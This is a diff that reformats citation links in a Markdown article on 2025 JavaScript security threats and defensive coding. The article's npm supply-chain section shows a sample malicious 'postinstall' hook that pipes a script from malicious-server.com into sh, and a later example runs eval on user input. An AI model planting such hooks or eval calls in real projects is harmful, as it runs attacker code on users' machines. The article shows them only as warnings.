@@ -26,14 +26,14 @@ The npm ecosystem remains a prime target. In June 2025, multiple zero-day vulner
   "postinstall": "curl -s https://malicious-server.com/payload.sh | sh"
 }
 ```
-- **Mitigation**: Lock dependencies with `npm ci`, use `npm audit` (link: https://docs.npmjs.com/cli/v10/commands/npm-audit), and consider GitHub’s Dependabot (link: https://docs.github.com/en/code-security/dependabot) for auto-vulnerability detection. Always review third-party packages before installing.
+- **Mitigation**: Lock dependencies with `npm ci`, use `npm audit` ([npm audit docs](https://docs.npmjs.com/cli/v10/commands/npm-audit)), and consider GitHub’s Dependabot ([Dependabot docs](https://docs.github.com/en/code-security/dependabot)) for auto-vulnerability detection. Always review third-party packages before installing.
 
 ### b. Zero-Day Vulnerabilities in Browsers & JS Engines
-- **Google Chrome (CVE-2025-5419)**: The third actively exploited zero-day in 2025, leveraging new JS engine features for privilege escalation (link: https://chromereleases.googleblog.com/2025/07/stable-channel-update-for-desktop.html).
-- **Microsoft Copilot (CVE-2025-32711)**: Known as "EchoLeak," this zero-click data exfiltration via prompt injection in a widely used developer tool was patched quickly after disclosure (link: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711).
+- **Google Chrome (CVE-2025-5419)**: The third actively exploited zero-day in 2025, leveraging new JS engine features for privilege escalation ([Chrome release notes](https://chromereleases.googleblog.com/2025/07/stable-channel-update-for-desktop.html)).
+- **Microsoft Copilot (CVE-2025-32711)**: Known as "EchoLeak," this zero-click data exfiltration via prompt injection in a widely used developer tool was patched quickly after disclosure ([Microsoft security update](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711)).
 
 ### c. Exploits Targeting Frameworks
-- **WordPress Theme "Motors" (CVE-2025-4322)**: A privilege escalation bug hijacked admin accounts, driven by vulnerable JS plugin code failing to validate user input (link: https://wordpress.org/news/2025/07/security-release/).
+- **WordPress Theme "Motors" (CVE-2025-4322)**: A privilege escalation bug hijacked admin accounts, driven by vulnerable JS plugin code failing to validate user input ([WordPress security release](https://wordpress.org/news/2025/07/security-release/)).
 
 ## 2. New JavaScript Features & Potential Pitfalls
 
@@ -47,7 +47,7 @@ The npm ecosystem remains a prime target. In June 2025, multiple zero-day vulner
   let emojiPattern = /\p{RGI_Emoji}/v;
   let result = emojiPattern.test("Hello 😄"); // true if emoji detected
   ```
-- **Warning**: Sanitize user-supplied regex patterns to prevent ReDoS (Regular Expression Denial of Service) attacks (link: https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS).
+- **Warning**: Sanitize user-supplied regex patterns to prevent ReDoS (Regular Expression Denial of Service) attacks ([OWASP ReDoS info](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)).
 
 ### Promise.try()
 - **Feature**: Catches sync exceptions in promise chains.
@@ -63,12 +63,12 @@ The npm ecosystem remains a prime target. In June 2025, multiple zero-day vulner
   ```
 
 ### Node, Deno, and Bun Divergence
-2025 sees growing runtime divergence, causing compatibility and breakage bugs in cross-platform packages (link: https://nodejs.org/en/blog/2025/01/runtime-trends).
+2025 sees growing runtime divergence, causing compatibility and breakage bugs in cross-platform packages ([Node.js runtime trends](https://nodejs.org/en/blog/2025/01/runtime-trends)).
 
 ## 3. The Role of React and Modern UI Attacks
 
 ### Server Components & SSR
-- **Trend**: React 19 and Next.js adopt Server Components, reducing client bundle size by shifting logic server-side (link: https://nextjs.org/blog/next-15).
+- **Trend**: React 19 and Next.js adopt Server Components, reducing client bundle size by shifting logic server-side ([Next.js blog](https://nextjs.org/blog/next-15)).
 - **Attack Angle**: SSR endpoints can expose sensitive data or internal APIs if not isolated.
 - **Prevention Example**:
   ```javascript
@@ -81,10 +81,10 @@ The npm ecosystem remains a prime target. In June 2025, multiple zero-day vulner
   ```
 
 ### Real-World Exploit
-- **Case**: Several 2025 attacks exploited React apps by injecting malicious JavaScript through misconfigured SSR endpoints, leading to data leaks (link: https://react.dev/blog/2025/security-updates).
+- **Case**: Several 2025 attacks exploited React apps by injecting malicious JavaScript through misconfigured SSR endpoints, leading to data leaks ([React security updates](https://react.dev/blog/2025/security-updates)).
 
 ## 4. Leveraging AI for Proactive Defense
-AI coding assistants (GitHub Copilot, Codeium, TabNine) now flag insecure code, detect outdated npm packages, and assist with secure Express/React endpoints (link: https://github.com/features/copilot, https://codeium.com/blog/ai-security).
+AI coding assistants (GitHub Copilot, Codeium, TabNine) now flag insecure code, detect outdated npm packages, and assist with secure Express/React endpoints ([GitHub Copilot features](https://github.com/features/copilot), [Codeium AI security blog](https://codeium.com/blog/ai-security)).
 
 **Example: Using AI to Spot Bad Practices**
 ```javascript
@@ -93,14 +93,14 @@ function runUserScript(input) {
   eval(input); // AI warning: Security risk—code injection possible!
 }
 ```
-- **Best Practice**: Avoid `eval` on user input; use AI-powered code reviews (link: https://tabnine.com/blog/ai-code-security).
+- **Best Practice**: Avoid `eval` on user input; use AI-powered code reviews ([TabNine AI security](https://tabnine.com/blog/ai-code-security)).
 
 ## 5. Key Defensive Coding Practices
 - **Lock dependencies**: Use exact versions in `package.json` and `npm ci`.
-- **Run audits**: Regularly execute `npm audit` and act on advisories (link: https://docs.npmjs.com/cli/v10/commands/npm-audit).
-- **Enforce CSP**: Implement Content Security Policy on all web assets (link: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
+- **Run audits**: Regularly execute `npm audit` and act on advisories ([npm audit docs](https://docs.npmjs.com/cli/v10/commands/npm-audit)).
+- **Enforce CSP**: Implement Content Security Policy on all web assets ([MDN CSP guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)).
 - **Avoid direct user input**: Exclude user data in RegExp, `eval`, or dynamic imports.
-- **Secure SSR endpoints**: Validate all incoming requests (link: https://nextjs.org/docs/app/building-your-application/securing-your-app).
+- **Secure SSR endpoints**: Validate all incoming requests ([Next.js security docs](https://nextjs.org/docs/app/building-your-application/securing-your-app)).
 - **Leverage AI tools**: Use static analysis for peer code review.
 
 ## Also Read
